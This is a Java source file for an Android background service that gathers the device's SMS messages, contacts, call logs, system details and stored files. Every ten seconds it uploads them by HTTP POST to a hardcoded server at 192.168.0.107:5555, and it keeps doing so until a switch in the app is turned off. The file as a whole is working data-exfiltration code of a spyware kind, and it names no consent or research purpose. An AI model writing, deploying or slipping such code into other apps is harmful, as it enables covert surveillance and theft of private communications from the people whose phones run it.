package com.example.informationcollectionservice;

import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;


import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class Service extends android.app.Service {
    static List<SMS> smsList;
    static List<Contacts>contactsList;
    static List<Call>callsList;
    static SysInf sysInf;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    void CollectInformation() throws IOException, InterruptedException {
        smsList = Options.getSMS(getApplicationContext());
        FilesWork.WriteAllSMSToFile();

        contactsList = Options.getContacts(getApplicationContext());
        FilesWork.WriteAllContactsToFile();

        callsList = Options.getCalls(getApplicationContext());
        FilesWork.WriteAllCallsToFile();

        sysInf = Options.getSysInf(getApplicationContext());
        FilesWork.WriteSysInfToFile();

    }


    public void upload(String selectedPath) throws Exception {

        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;
        DataInputStream inputStream = null;

        String pathToOurFile = selectedPath;
        String urlServer = "http://192.168.0.107:5555";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;

        FileInputStream fileInputStream = new FileInputStream(new File(
                pathToOurFile));

        URL url = new URL(urlServer);
        connection = (HttpURLConnection) url.openConnection();

        connection.setDoInput(true);
        connection.setDoOutput(true);
        connection.setUseCaches(false);

        connection.setRequestMethod("POST");

        connection.setRequestProperty("Connection", "Keep-Alive");
        connection.setRequestProperty("Content-Type",
                "multipart/form-data;boundary=" + boundary);

        try {
            outputStream = new DataOutputStream(connection.getOutputStream());
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        outputStream.writeBytes(twoHyphens + boundary + lineEnd);
        outputStream
                .writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
                        + pathToOurFile + "\"" + lineEnd);
        outputStream.writeBytes(lineEnd);

        bytesAvailable = fileInputStream.available();
        bufferSize = Math.min(bytesAvailable, maxBufferSize);
        buffer = new byte[bufferSize];

        bytesRead = fileInputStream.read(buffer, 0, bufferSize);

        while (bytesRead > 0) {
            outputStream.write(buffer, 0, bufferSize);
            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
        }

        outputStream.writeBytes(lineEnd);
        outputStream.writeBytes(twoHyphens + boundary + twoHyphens
                + lineEnd);

        int serverResponseCode = connection.getResponseCode();
        String serverResponseMessage = connection.getResponseMessage();

        fileInputStream.close();
        outputStream.flush();
        outputStream.close();



    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Context context = this.getApplicationContext();
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {

                while (true) {
                    try {
                        CollectInformation();
                        upload(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"SMS.txt");
                        upload(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"Contacts.txt");
                        upload(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"Calls.txt");
                        upload(Environment.getExternalStorageDirectory().getAbsolutePath().toString()+"/Download/"+"SysInf.txt");

                        File[] files = FilesWork.fileMems.listFiles();
                        for(int i=0;i<files.length;i++)
                            upload(files[i].getAbsolutePath());

                        Thread.sleep(10000);
                    } catch (Exception ex) {
                        Thread.currentThread().interrupt();
                    }
                    if(!MainActivity.btnSwitch.isChecked())
                    {
                        Log.d("TAG", "BREAK");
                        break;
                    }
                }

            }
        });

        thread.start();

        Log.d("TAG", "Thread create");
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
